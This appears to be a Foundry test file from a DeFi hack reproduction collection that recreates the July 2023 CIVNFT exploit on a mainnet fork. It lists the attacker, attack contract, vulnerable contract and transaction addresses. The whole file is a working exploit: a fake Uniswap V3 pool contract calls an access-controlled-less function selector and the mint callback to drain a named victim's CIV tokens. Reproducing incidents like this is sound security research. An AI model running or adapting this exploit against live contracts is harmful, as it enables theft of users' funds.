// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~180K USD$
// Attacker : https://etherscan.io/address/0xbf9df575670c739d9bf1424d4913e7244ed3ff66
// Attack Contract : https://etherscan.io/address/0x1ae3929e1975043e5443868be91cac12d8cc25ec
// Vulnerable Contract : https://etherscan.io/address/0xf169bd68ed72b2fdc3c9234833197171aa000580
// Attack Tx : https://etherscan.io/tx/0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1677722208893022210
// https://news.civfund.org/civtrade-hack-analysis-9a2398a6bc2e
// https://blog.solidityscan.com/civnft-hack-analysis-4ee79b8c33d1

// Similar incident: https://github.com/SunWeb3Sec/DeFiHackLabs#20230708-civfund---lack-of-access-control

contract CIVNFTTest is Test {
    struct Slot0 {
        // the current price
        uint160 sqrtPriceX96;
        // the current tick
        int24 tick;
        // the most-recently updated index of the observations array
        uint16 observationIndex;
        // the current maximum number of observations that are being stored
        uint16 observationCardinality;
        // the next maximum number of observations to store, triggered in observations.write
        uint16 observationCardinalityNext;
        // the current protocol fee as a percentage of the swap fee taken on withdrawal
        // represented as an integer denominator (1/x)%
        uint8 feeProtocol;
        // whether the pool is locked
        bool unlocked;
    }

    IERC20 private constant CIV = IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private constant CIVNFT = 0xF169BD68ED72B2fdC3C9234833197171AA000580;
    address private constant victim = 0x512e9701D314b365921BcB3b8265658A152C9fFD;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_649_875);
        cheats.label(address(CIV), "CIV");
        cheats.label(address(WETH), "WETH");
        cheats.label(CIVNFT, "CIVNFT");
        cheats.label(victim, "victim");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker CIV balance before exploit", CIV.balanceOf(address(this)), CIV.decimals());
        // Calling vulnerable function in CIVNFT contract
        call0x7ca06d68();
        emit log_named_decimal_uint("Attacker CIV balance after exploit", CIV.balanceOf(address(this)), CIV.decimals());
    }

    function token0() external view returns (address) {
        return address(CIV);
    }

    function token1() external view returns (address) {
        return address(WETH);
    }

    function tickSpacing() external pure returns (int24) {
        return 60;
    }

    function slot0() external pure returns (Slot0 memory) {
        return Slot0({
            sqrtPriceX96: 590_212_530_842_204_246_875_907_781,
            tick: -97_380,
            observationIndex: 0,
            observationCardinality: 1,
            observationCardinalityNext: 1,
            feeProtocol: 0,
            unlocked: true
        });
    }

    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1) {
        callUniswapV3MintCallback();
    }

    function call0x7ca06d68() internal {
        (bool success,) = CIVNFT.call(
            abi.encodeWithSelector(
                bytes4(0x7ca06d68), // vulnerable function selector
                address(this), // fake uniswap pool
                abi.encodePacked("0.000059"),
                -97_385, // int24 tick
                195_476_868_337_608_980_000_000, // uint256
                0, // uint256
                true // bool
            )
        );
        require(success, "Call to CIVNFT failed");
    }

    function callUniswapV3MintCallback() internal {
        bytes memory data = abi.encode(victim, victim);
        (bool success,) = CIVNFT.call(abi.encodeWithSelector(bytes4(0xd3487997), CIV.balanceOf(victim), 0, data));
        require(success, "Call to Uniswap callback failed");
    }
}
